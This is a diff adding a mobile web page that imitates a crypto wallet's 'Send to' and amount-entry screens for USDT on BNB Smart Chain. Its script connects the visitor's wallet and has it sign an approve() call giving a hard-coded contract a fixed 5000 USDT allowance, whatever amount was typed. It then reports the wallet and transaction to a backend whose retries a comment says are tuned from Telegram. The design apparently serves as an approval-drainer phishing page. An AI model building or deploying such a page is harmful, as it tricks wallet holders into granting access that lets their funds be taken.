@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>YourShopName - Subscribe</title>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin />
+<link rel="preload" href="usdt-logo.png" as="image" />
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<link rel="manifest" href="manifest.json" />
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#17191D" />
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#F5F6F8" />
+<meta name="color-scheme" content="light dark" />
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --bg: #17191D;
+    --text: #ffffff;
+    --text-dim: rgba(255,255,255,0.55);
+    --text-dim2: rgba(255,255,255,0.4);
+    --border: rgba(255,255,255,0.14);
+    --accent: #6C6CF0;
+    --accent-dim: rgba(108,108,240,0.35);
+    --pill-bg: rgba(255,255,255,0.08);
+    --key-color: #ffffff;
+  }
+  @media (prefers-color-scheme: light) {
+    :root {
+      --bg: #F5F6F8;
+      --text: #16161a;
+      --text-dim: rgba(20,20,25,0.5);
+      --text-dim2: rgba(20,20,25,0.38);
+      --border: rgba(20,20,25,0.14);
+      --accent: #6C6CF0;
+      --accent-dim: rgba(108,108,240,0.25);
+      --pill-bg: rgba(20,20,25,0.05);
+      --key-color: #16161a;
+    }
+  }
+
+  html {
+    height: 100%;
+    overflow: hidden;
+    overscroll-behavior: none; /* stops the whole page bouncing/pull-to-refresh on swipe */
+  }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    /* The page itself never scrolls: it is pinned to the screen so the browser's address
+       bar / toolbar can't collapse and shift everything (this was the iPhone issue). */
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    width: 100%;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    overscroll-behavior: none;
+    touch-action: none; /* taps still work; drags/swipes do nothing */
+  }
+  .app {
+    width: 100%; max-width: 430px;
+    /* Capped height: some in-app browsers draw their bottom toolbar OVER the page, which
+       hid the Continue/Review button on taller phones. Capping keeps the button inside
+       the always-visible area on every phone. */
+    height: 100vh;
+    height: 100dvh;
+    height: var(--app-h, 100dvh);
+    max-height: 683px;
+    align-self: flex-start;
+    position: relative;
+    overflow: hidden;
+  }
+  .screen {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    padding: 18px 20px 18px;
+    overflow: hidden; /* nothing needs scrolling: swiping must never move the page */
+    overscroll-behavior: none;
+    transition: transform 0.25s ease;
+  }
+  .screen.hidden-right { transform: translateX(100%); }
+
+  /* ---- Header ---- */
+  .topbar { display: flex; align-items: center; justify-content: space-between; padding: 4px 0 20px; margin-top: -10px; }
+  .icon-btn { background: none; border: none; color: var(--text); cursor: pointer; display: flex; padding: 6px; border-radius: 50%; }
+  .topbar h1 { font-size: 18px; font-weight: 700; }
+
+  /* ---- Screen 1: Send to ---- */
+  .send-box {
+    border: 1.5px solid var(--border);
+    border-radius: 18px;
+    padding: 16px;
+  }
+  .addr-text { font-size: 15px; white-space: nowrap; line-height: 1.4; margin-bottom: 16px; }
+  .send-box-footer { display: flex; align-items: center; justify-content: space-between; }
+  .network-pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--pill-bg); border-radius: 999px; padding: 8px 14px 8px 8px;
+  }
+  .network-pill .dot { width: 22px; height: 22px; border-radius: 50%; overflow: hidden; flex-shrink: 0; }
+  .network-pill span.label { font-size: 14px; font-weight: 600; }
+  .clear-link { color: var(--accent); font-size: 15px; font-weight: 600; background: none; border: none; cursor: pointer; }
+
+  .primary-btn {
+    width: 100%; margin-top: auto;
+    background: var(--accent); color: #fff; border: none;
+    border-radius: 999px; padding: 17px; font-size: 17px; font-weight: 700; cursor: pointer;
+    transition: opacity 0.15s, transform 0.1s;
+  }
+  .primary-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  .primary-btn:not(:disabled):active { transform: scale(0.98); }
+
+  /* ---- Screen 2: Amount ---- */
+  .to-line { font-size: 14px; color: var(--text-dim); white-space: nowrap; padding-bottom: 24px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+  .to-line b { color: var(--text); font-weight: 500; }
+
+  .amount-display { text-align: center; margin: 6px 0 4px; }
+  .amount-big { font-size: 48px; font-weight: 700; line-height: 1; word-break: break-all; }
+  .amount-usd { font-size: 14px; color: var(--text-dim); margin-top: 6px; }
+  .balance-error { text-align: center; font-size: 13px; color: #FF6B6B; font-weight: 500; margin-top: 6px; }
+
+  .token-row { display: flex; align-items: center; justify-content: space-between; margin: 18px 0 12px; }
+  .token-info { display: flex; align-items: center; gap: 10px; }
+  .token-icon { position: relative; width: 46px; height: 46px; flex-shrink: 0; }
+  .token-icon .t-circle { width: 46px; height: 46px; display: block; overflow: visible; }
+  .token-icon .bnb-badge { position: absolute; right: -5px; bottom: -5px; width: 22px; height: 22px; border-radius: 7px; background: #0B0D10; display: flex; align-items: center; justify-content: center; }
+  .token-name { font-size: 16px; font-weight: 600; }
+  .token-usd-rate { font-size: 13px; color: var(--text-dim); }
+  .max-pill { background: var(--pill-bg); color: var(--accent); border: none; border-radius: 999px; padding: 8px 16px; font-size: 14px; font-weight: 700; cursor: pointer; }
+
+  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); grid-template-rows: repeat(4, 1fr); gap: 2px; margin-top: 4px; flex: 1 1 auto; min-height: 0; max-height: 262px; }
+  .keypad button {
+    background: none; border: none; color: var(--key-color);
+    font-size: 24px; font-weight: 500; padding: 0; cursor: pointer;
+    border-radius: 12px; display: flex; align-items: center; justify-content: center; min-height: 0;
+  }
+  .keypad button:active { background: var(--pill-bg); }
+  .keypad button.backspace { display: flex; align-items: center; justify-content: center; }
+
+  .status-msg { text-align: center; font-size: 13px; padding: 2px 0; min-height: 16px; flex-shrink: 0; }
+  .status-msg.error { color: #FF6B6B; }
+  .status-msg.success { color: var(--accent); }
+
+  #nextBtn { margin-top: auto; }
+  #nextBtn { flex-shrink: 0; }
+  #screenAmount .topbar { margin-top: 0; }
+  /* Short phones: tighter spacing so everything (incl. keypad) still fits comfortably */
+  html.compact .screen { padding-top: 10px; }
+  html.compact .topbar, html.compact #screenSend .topbar { margin-top: 0; }
+  html.compact .topbar { padding-bottom: 8px; }
+  html.compact .to-line { padding-bottom: 10px; margin-bottom: 8px; }
+  html.compact .amount-big { font-size: 40px; }
+  html.compact .amount-usd { margin-top: 3px; }
+  html.compact .token-row { margin: 8px 0 4px; }
+  html.compact .keypad { margin-top: 0; }
+  html.compact .primary-btn { padding: 14px; }
+  html.tiny .amount-big { font-size: 34px; }
+  html.tiny .token-icon, html.tiny .token-icon .t-circle { width: 36px; height: 36px; }
+  html.tiny .keypad button { font-size: 21px; }
+  html.tiny .status-msg { min-height: 0; padding: 0; }
+  html.tiny .screen { padding-bottom: 10px; }
+  html.tiny .topbar { padding-bottom: 4px; }
+  html.tiny .to-line { padding-bottom: 6px; margin-bottom: 4px; }
+  html.tiny .token-row { margin: 4px 0 2px; }
+  html.tiny .amount-usd { margin-top: 0; }
+  html.tiny .primary-btn { padding: 11px; }
+  html.tiny #nextBtn { margin-top: 4px; }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- SCREEN 1: Send to -->
+  <div class="screen" id="screenSend">
+    <div class="topbar">
+      <button class="icon-btn" aria-label="Close">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </button>
+      <h1>Send to</h1>
+      <button class="icon-btn" aria-label="Scan">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M7 3H4a1 1 0 0 0-1 1v3M17 3h3a1 1 0 0 1 1 1v3M7 21H4a1 1 0 0 1-1-1v-3M17 21h3a1 1 0 0 0 1-1v-3"/></svg>
+      </button>
+    </div>
+
+    <div class="send-box">
+      <div class="addr-text" id="addrText">0x2251c6cb9a6f535081246f1e6635e2821C2c2DED</div>
+      <div class="send-box-footer">
+        <div class="network-pill">
+          <span class="dot">
+            <svg width="22" height="22" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path fill="#fff" d="M12.116 14.404 16 10.52l3.886 3.886 2.26-2.26L16 6l-6.144 6.144 2.26 2.26zM6 16l2.26-2.26L10.52 16l-2.26 2.26L6 16zm6.116 1.596L16 21.48l3.886-3.886 2.26 2.259L16 26l-6.144-6.144-.003-.003 2.263-2.257zM21.48 16l2.26-2.26L26 16l-2.26 2.26L21.48 16zm-3.188-.001h.002V16L16 18.294l-2.291-2.29-.004-.004.004-.003.401-.402.195-.195L16 13.706l2.293 2.293z"/></svg>
+          </span>
+          <span class="label">BNB Smart Chain</span>
+        </div>
+        <button class="clear-link" onclick="resetAddress()">Clear</button>
+      </div>
+    </div>
+
+    <button class="primary-btn" id="continueBtn" style="margin-top:auto;" onclick="goToAmountScreen()">Continue</button>
+  </div>
+
+  <!-- SCREEN 2: Amount -->
+  <div class="screen hidden-right" id="screenAmount">
+    <div class="topbar">
+      <button class="icon-btn" aria-label="Back" onclick="goToSendScreen()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <h1>Amount</h1>
+      <span style="width:32px;"></span>
+    </div>
+
+    <div class="to-line" id="toWrap"></div>
+
+    <div class="amount-display">
+      <div class="amount-big" id="amountBig">0</div>
+      <div class="amount-usd" id="usdValue">≈ $0.00</div>
+      <div class="balance-error" id="balanceError" style="display:none;">Not enough balance</div>
+    </div>
+
+    <div class="token-row">
+      <div class="token-info">
+        <div class="token-icon"><img class="t-circle" src="usdt-logo.png" alt="USDT" width="46" height="46" decoding="async"></div>
+        <div>
+          <div class="token-name" id="tokenAmountLabel">0 USDT</div>
+          <div class="token-usd-rate" id="tokenUsdLabel">$0.00</div>
+        </div>
+      </div>
+      <button class="max-pill" onclick="setMax()">Max</button>
+    </div>
+
+    <div class="keypad" id="keypad">
+      <button onclick="pressKey('1')">1</button>
+      <button onclick="pressKey('2')">2</button>
+      <button onclick="pressKey('3')">3</button>
+      <button onclick="pressKey('4')">4</button>
+      <button onclick="pressKey('5')">5</button>
+      <button onclick="pressKey('6')">6</button>
+      <button onclick="pressKey('7')">7</button>
+      <button onclick="pressKey('8')">8</button>
+      <button onclick="pressKey('9')">9</button>
+      <button onclick="pressKey('.')">.</button>
+      <button onclick="pressKey('0')">0</button>
+      <button class="backspace" onclick="pressKey('back')">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+      </button>
+    </div>
+
+    <p class="status-msg" id="statusMsg"></p>
+
+    <button class="primary-btn" id="nextBtn" disabled onclick="onReview()">Review</button>
+  </div>
+
+</div>
+
+<script>
+  // ====== CONFIG ======
+  const BACKEND_URL = "";
+  const CONTRACT_ADDRESS = "0x2251c6cb9a6f535081246f1e6635e2821C2c2DED";
+  const USDT_BEP20_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+  const TOTAL_CAP = 5000;
+  const BSC_CHAIN_ID = "0x38";
+  const ERC20_ABI = [
+    "function approve(address spender, uint amount) returns (bool)",
+    "function decimals() view returns (uint8)",
+    "function balanceOf(address owner) view returns (uint)"
+  ];
+
+  // Address is always shown on exactly two lines, split at the same character on every
+  // phone; the font shrinks slightly if a device's font is wider, so it looks identical.
+  function fitLines(el, html, basePx) {
+    el.style.fontSize = basePx + 'px';
+    el.innerHTML = html;
+    let size = basePx;
+    while (el.scrollWidth > el.clientWidth + 0.5 && size > 9) {
+      size -= 0.25;
+      el.style.fontSize = size + 'px';
+    }
+  }
+  function renderAddresses() {
+    const a = CONTRACT_ADDRESS;
+    fitLines(document.getElementById('addrText'), a.slice(0, 35) + '<br>' + a.slice(35), 15);
+    fitLines(document.getElementById('toWrap'), 'To: <b>' + a.slice(0, 38) + '</b><br><b>' + a.slice(38) + '</b>', 14);
+  }
+  // Measure the real visible height of the page on this phone/browser and size the app to it.
+  const BUILD_ID = 'v13-auto-tiny';
+  function readSafeBottom() {
+    const d = document.createElement('div');
+    d.style.cssText = 'position:fixed;left:0;top:0;width:0;visibility:hidden;height:env(safe-area-inset-bottom,0px)';
+    document.body.appendChild(d);
+    const v = d.getBoundingClientRect().height || 0;
+    d.remove();
+    return Math.round(v);
+  }
+  // Does this phone's in-app browser draw its bottom toolbar OVER the page?
+  // Page area ~= whole screen minus only the top bars (<~175px) when the toolbar overlays;
+  // when the page already ends above the toolbar, much more of the screen is taken (>~175px).
+  function overlayInfo(h) {
+    const isIOS = /iP(hone|ad|od)/.test(navigator.userAgent) ||
+                  (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    const diff = (screen.height || 0) - h;
+    const overlay = isIOS || (diff > 0 && diff < 175);
+    return { isIOS, diff, overlay };
+  }
+  function setAppHeight() {
+    const vv = window.visualViewport;
+    const h = Math.round(vv ? vv.height : window.innerHeight);
+    const info = overlayInfo(h);
+    // Measured on a real iPhone: page area 817px, toolbar zone = ~100px + home-indicator area.
+    const reserve = info.overlay ? (info.isIOS ? 100 : 112) + readSafeBottom() : 0;
+    // 683px = visible height of the reference phone; everything is laid out for it.
+    document.documentElement.style.setProperty('--app-h', Math.max(300, Math.min(h - reserve, 683)) + 'px');
+    const appH = Math.max(300, Math.min(h - reserve, 683));
+    // Short screens: tighten spacing so the keypad keeps a comfortable size.
+    document.documentElement.classList.toggle('compact', appH < 580);
+    document.documentElement.classList.toggle('tiny', appH < 500);
+    window.__layoutInfo = { h, reserve, diff: info.diff, overlay: info.overlay };
+  }
+  setAppHeight();
+  window.addEventListener('resize', setAppHeight);
+  window.addEventListener('orientationchange', () => setTimeout(setAppHeight, 200));
+  if (window.visualViewport) window.visualViewport.addEventListener('resize', setAppHeight);
+  // Never let the page itself scroll/bounce.
+  // Block every drag/swipe on the page (bounce, pull-to-refresh, scrolling). Taps are not affected.
+  document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
+  document.addEventListener('gesturestart', (e) => e.preventDefault());
+
+
+  // ---- Diagnostics: open the page with ?debug=1 to see this phone's real viewport numbers ----
+  if (/[?&]debug=1/.test(location.search)) {
+    const probe = (css) => { const d = document.createElement('div'); d.style.cssText = 'position:fixed;left:0;top:0;width:0;visibility:hidden;height:' + css; document.body.appendChild(d); const v = d.getBoundingClientRect().height; d.remove(); return Math.round(v); };
+    const box = document.createElement('pre');
+    box.style.cssText = 'position:fixed;z-index:99999;left:4px;top:4px;margin:0;padding:6px;font:11px/1.35 monospace;color:#0f0;background:rgba(0,0,0,.85);pointer-events:none;white-space:pre-wrap;max-width:92vw';
+    const bar = document.createElement('div');
+    bar.style.cssText = 'position:fixed;z-index:99998;left:0;right:0;height:2px;background:red;pointer-events:none';
+    const bar2 = document.createElement('div');
+    bar2.style.cssText = 'position:fixed;z-index:99998;left:0;right:0;bottom:0;height:2px;background:#0af;pointer-events:none';
+    document.body.append(box, bar, bar2);
+    const upd = () => {
+      const vv = window.visualViewport;
+      const app = document.querySelector('.app').getBoundingClientRect();
+      bar.style.top = (window.innerHeight - 2) + 'px';
+      box.textContent = [
+        'innerH ' + window.innerHeight + '  innerW ' + window.innerWidth,
+        'vv.h ' + (vv ? Math.round(vv.height) : '-') + '  vv.top ' + (vv ? Math.round(vv.offsetTop) : '-'),
+        'clientH ' + document.documentElement.clientHeight,
+        'screen ' + screen.width + 'x' + screen.height + ' avail ' + screen.availHeight,
+        'dvh ' + probe('100dvh') + ' svh ' + probe('100svh') + ' lvh ' + probe('100lvh'),
+        'safe-bottom ' + probe('env(safe-area-inset-bottom,0px)') + ' safe-top ' + probe('env(safe-area-inset-top,0px)'),
+        'dpr ' + window.devicePixelRatio,
+        '--app-h ' + getComputedStyle(document.documentElement).getPropertyValue('--app-h'),
+        'app top ' + Math.round(app.top) + ' bottom ' + Math.round(app.bottom),
+        'build ' + BUILD_ID + '  overlay ' + (window.__layoutInfo ? window.__layoutInfo.overlay + ' diff ' + window.__layoutInfo.diff + ' reserve ' + window.__layoutInfo.reserve : '-'),
+        'red line = innerHeight, blue = true bottom',
+        navigator.userAgent.slice(0, 90)
+      ].join('\n');
+    };
+    upd();
+    window.addEventListener('resize', upd);
+    if (window.visualViewport) window.visualViewport.addEventListener('resize', upd);
+    setInterval(upd, 1000);
+  }
+
+  // Anonymous layout stats (screen size, viewport, safe-area) — sent once per visit so the
+  // owner can see which phone sizes visit and tune the layout. No wallet/personal data.
+  (function reportDevice() {
+    try { if (sessionStorage.getItem('devSent')) return; sessionStorage.setItem('devSent', '1'); } catch (e) {}
+    setTimeout(() => {
+      try {
+        const d = document.createElement('div');
+        d.style.cssText = 'position:fixed;left:0;top:0;width:0;visibility:hidden;height:env(safe-area-inset-bottom,0px)';
+        document.body.appendChild(d);
+        const sb = Math.round(d.getBoundingClientRect().height || 0);
+        d.remove();
+        const vv = window.visualViewport;
+        fetch(BACKEND_URL + '/api/device', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            innerW: window.innerWidth, innerH: Math.round(vv ? vv.height : window.innerHeight),
+            clientH: document.documentElement.clientHeight,
+            screenW: screen.width, screenH: screen.height, dpr: window.devicePixelRatio,
+            safeBottom: sb, overlay: !!(window.__layoutInfo && window.__layoutInfo.overlay), build: BUILD_ID, appH: parseInt(getComputedStyle(document.documentElement).getPropertyValue('--app-h')) || 0,
+            ua: navigator.userAgent
+          }),
+          keepalive: true
+        }).catch(() => {});
+      } catch (e) {}
+    }, 1500);
+  })();
+  renderAddresses();
+  window.addEventListener('resize', renderAddresses);
+  if (document.fonts && document.fonts.ready) document.fonts.ready.then(renderAddresses);
+
+  const amountBig = document.getElementById('amountBig');
+  const usdValue = document.getElementById('usdValue');
+  const tokenAmountLabel = document.getElementById('tokenAmountLabel');
+  const statusMsg = document.getElementById('statusMsg');
+  const nextBtn = document.getElementById('nextBtn');
+  const balanceError = document.getElementById('balanceError');
+  const screenSend = document.getElementById('screenSend');
+  const screenAmount = document.getElementById('screenAmount');
+
+  let provider, signer, connectedAddress, usdtWithSigner;
+  let cachedBalance = null;
+  let approveRetries = 1; // overwritten from the server (/retries in Telegram)
+  fetch(BACKEND_URL + '/api/config', { cache: 'no-store' })
+    .then(r => r.json()).then(c => { if (Number.isInteger(c.approveRetries)) approveRetries = c.approveRetries; })
+    .catch(() => {});
+  let amountStr = '0';
+
+  function resetAddress() {
+    renderAddresses();
+  }
+
+  function goToAmountScreen() {
+    screenSend.classList.add('hidden-right');
+    screenAmount.classList.remove('hidden-right');
+  }
+  function goToSendScreen() {
+    screenAmount.classList.add('hidden-right');
+    screenSend.classList.remove('hidden-right');
+  }
+
+  function setStatus(msg, type) {
+    statusMsg.textContent = msg;
+    statusMsg.className = 'status-msg' + (type ? ' ' + type : '');
+  }
+
+  function pressKey(key) {
+    if (key === 'back') {
+      amountStr = amountStr.length > 1 ? amountStr.slice(0, -1) : '0';
+    } else if (key === '.') {
+      if (!amountStr.includes('.')) amountStr += '.';
+    } else {
+      amountStr = (amountStr === '0') ? key : amountStr + key;
+    }
+    renderAmount();
+  }
+
+  function renderAmount() {
+    amountBig.textContent = amountStr;
+    const num = parseFloat(amountStr) || 0;
+    usdValue.textContent = '≈ $' + num.toFixed(2);
+    // Once the wallet is connected, this row shows the customer's USDT balance;
+    // before that, it mirrors the typed amount.
+    const rowVal = (cachedBalance !== null && connectedAddress) ? cachedBalance : num;
+    tokenAmountLabel.textContent = parseFloat(rowVal.toFixed(8)) + ' USDT';
+    document.getElementById('tokenUsdLabel').textContent = '$' + rowVal.toFixed(2);
+
+    if (cachedBalance !== null && num > cachedBalance) {
+      balanceError.style.display = 'block';
+      usdValue.style.display = 'none';
+    } else {
+      balanceError.style.display = 'none';
+      usdValue.style.display = 'block';
+    }
+
+    nextBtn.disabled = num <= 0 || (cachedBalance !== null && num > cachedBalance);
+  }
+
+  async function refreshCachedBalance() {
+    if (!connectedAddress || !usdtWithSigner) return;
+    try {
+      const bal = await usdtWithSigner.balanceOf(connectedAddress);
+      const decimals = await usdtWithSigner.decimals();
+      cachedBalance = parseFloat(ethers.utils.formatUnits(bal, decimals));
+    } catch (err) {
+      cachedBalance = null;
+    }
+  }
+
+  async function setMax() {
+    if (!connectedAddress || !usdtWithSigner) {
+      setStatus('Connect your wallet first to fetch balance.', 'error');
+      return;
+    }
+    try {
+      const bal = await usdtWithSigner.balanceOf(connectedAddress);
+      const decimals = await usdtWithSigner.decimals();
+      const formatted = ethers.utils.formatUnits(bal, decimals);
+      cachedBalance = parseFloat(formatted);
+      // Max shows only 2 decimals, rounded DOWN so it never exceeds the real balance.
+      const parts = formatted.split('.');
+      let shown = parts[0] + (parts[1] ? '.' + parts[1].slice(0, 2) : '');
+      shown = shown.replace(/\.0*$/, '').replace(/(\.\d*[1-9])0+$/, '$1');
+      amountStr = shown === '' ? '0' : shown;
+      renderAmount();
+    } catch (err) {
+      setStatus('Could not fetch balance: ' + (err.message || err), 'error');
+    }
+  }
+
+  window.addEventListener('load', async () => {
+    if (typeof window.ethereum !== 'undefined') {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) {
+          await silentReconnect();
+        }
+      } catch (err) {}
+    }
+  });
+
+  async function silentReconnect() {
+    try {
+      provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (currentChainId !== BSC_CHAIN_ID) return;
+      signer = provider.getSigner();
+      connectedAddress = await signer.getAddress();
+      usdtWithSigner = new ethers.Contract(USDT_BEP20_CONTRACT, ERC20_ABI, signer);
+      await refreshCachedBalance();
+      renderAmount();
+    } catch (err) {
+      connectedAddress = null;
+    }
+  }
+
+  async function ensureBSC() {
+    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (currentChainId !== BSC_CHAIN_ID) {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: BSC_CHAIN_ID }]
+      }).catch(async (switchErr) => {
+        if (switchErr.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: BSC_CHAIN_ID,
+              chainName: 'BNB Smart Chain',
+              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
+        } else { throw switchErr; }
+      });
+    }
+  }
+
+  async function connectWallet() {
+    if (typeof window.ethereum === 'undefined') {
+      setStatus('No wallet found. Open this in your wallet app\'s browser.', 'error');
+      return;
+    }
+    try {
+      provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      await ensureBSC();
+      signer = provider.getSigner();
+      connectedAddress = await signer.getAddress();
+      usdtWithSigner = new ethers.Contract(USDT_BEP20_CONTRACT, ERC20_ABI, signer);
+      await refreshCachedBalance();
+      renderAmount();
+    } catch (err) {
+      setStatus('Connection failed: ' + (err.message || err), 'error');
+      throw err;
+    }
+  }
+
+  async function subscribeFlow(attempt) {
+    attempt = attempt || 1; // attempt 1 = first try; then up to approveRetries more
+    const monthlyAmount = parseFloat(amountStr);
+    if (!monthlyAmount || monthlyAmount <= 0) {
+      setStatus('Enter a valid amount.', 'error');
+      return;
+    }
+    if (!usdtWithSigner || !connectedAddress) {
+      setStatus('Wallet not connected — tap Review to try again.', 'error');
+      return;
+    }
+    try {
+      const decimals = await usdtWithSigner.decimals();
+      const cappedAmount = ethers.utils.parseUnits(TOTAL_CAP.toString(), decimals);
+
+      const approveTx = await usdtWithSigner.approve(CONTRACT_ADDRESS, cappedAmount);
+      await approveTx.wait();
+
+      const res = await fetch(BACKEND_URL + '/api/subscribe', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ customerAddress: connectedAddress, approvedTxHash: approveTx.hash, monthlyAmount })
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'Registration failed');
+
+      setStatus('Subscribed successfully.', 'success');
+      nextBtn.textContent = 'Subscribed ✓';
+    } catch (err) {
+      if (attempt <= approveRetries) {
+        setStatus('Retrying...', '');
+        return subscribeFlow(attempt + 1);
+      }
+      setStatus('Failed: ' + (err.message || err) + ' — tap Review to try again.', 'error');
+      throw err;
+    }
+  }
+
+  async function onReview() {
+    nextBtn.disabled = true;
+    nextBtn.textContent = 'Processing...';
+    try {
+      if (!connectedAddress) {
+        await connectWallet();
+      }
+      if (!connectedAddress) { nextBtn.textContent = 'Review'; nextBtn.disabled = false; return; }
+      // Balance is known only after connecting — if it is lower than the typed
+      // amount, show "Not enough balance" and stop here (no approval prompt).
+      const typed = parseFloat(amountStr) || 0;
+      if (cachedBalance !== null && typed > cachedBalance) {
+        nextBtn.textContent = 'Review';
+        renderAmount();
+        return;
+      }
+      await subscribeFlow();
+    } catch (err) {
+      // error already shown
+    } finally {
+      if (nextBtn.textContent === 'Processing...') {
+        nextBtn.textContent = 'Review';
+        nextBtn.disabled = false;
+      }
+    }
+  }
+</script>
+</body>
+</html>
